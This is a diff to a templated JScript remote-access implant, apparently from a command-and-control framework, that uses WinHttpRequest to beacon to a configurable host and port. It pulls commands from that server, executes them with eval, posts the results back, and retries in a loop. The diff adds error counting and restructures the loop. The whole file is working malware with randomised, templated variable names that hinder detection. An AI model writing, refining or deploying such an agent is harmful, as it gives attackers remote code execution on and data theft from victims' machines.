@@ -1,15 +1,15 @@
 var {{connection_id[0]}} = {{connection_id[1]}}
 
+var {{variables['errors'][0]}} = {{variables['errors'][1]}}
 var {{variables['host'][0]}} = "{{variables['host'][1]}}";
 var {{variables['port'][0]}} = "{{variables['port'][1]}}";
+var {{variables['sleep'][0]}} = "{{variables['sleep'][1]}}"
 var {{variables['useragent'][0]}} = "{{variables['useragent'][1]}}";
 var {{variables['content-type'][0]}} = "{{variables['content-type'][1]}}";
 var {{variables['x-frame-options'][0]}} = "{{variables['x-frame-options'][1]}}";
 var {{variables['wscript.shell'][0]}} = {{variables['wscript.shell'][1]}}
 
-var {{variables['username'][0]}} = {{variables['username'][1]}}
-
-function {{functions['post_req']}}(data){
+function {{variables['post_req']}}(data){
   var {{variables['winhttp.winhttprequest'][0]}} = {{variables['winhttp.winhttprequest'][1]}}
   {{variables['winhttp.winhttprequest'][0]}}.Open('Post', 'http://{{variables['host'][1]}}:{{variables['port'][1]}}{{checkin_uri}}');
   {{variables['winhttp.winhttprequest'][0]}}.setRequestHeader("User-Agent", "{{variables['useragent'][1]}}");
@@ -20,18 +20,24 @@ function {{functions['post_req']}}(data){
   return {{variables['winhttp.winhttprequest'][0]}}.ResponseText;
 }
 
-while(true){
-  sleep = '3000'
-  response = {{functions['post_req']}}('{"connection_id":"'+{{connection_id[0]}}+'"}');
-  var start = response.search('{')
-  var end = response.search('}')
-  json_data = "{" + response.substring(start+1, end) + "}"
-  eval("command = " + json_data)
-  if(command.eval){
-    results = eval(unescape(command.eval));
-    if(results){
-      {{functions['post_req']}}('{' + '"connection_id"' + ':"' + {{connection_id[0]}} + '",' + '"results"' + ':"' + escape(results) + '"}');
+try {
+  while(true){
+    response = {{variables['post_req']}}('{"connection_id":"'+{{connection_id[0]}}+'"}');
+    var start = response.search('{')
+    var end = response.search('}')
+    json_data = "{" + response.substring(start+1, end) + "}"
+    eval("command = " + json_data)
+    if(command.eval){
+      results = eval(unescape(command.eval));
+      if(results){
+        {{variables['post_req']}}('{' + '"connection_id"' + ':"' + {{connection_id[0]}} + '",' + '"results"' + ':"' + escape(results) + '"}');
+      }
     }
+    WScript.Sleep('3000')
   }
-  WScript.Sleep(sleep)
+} catch (e) {
+  {{variables['errors'][0]}} = {{variables['errors'][0]}} + 1;
+  if({{variables['errors'][0]}} > 150){
+    WScript.Quit(1);
+  }
 }
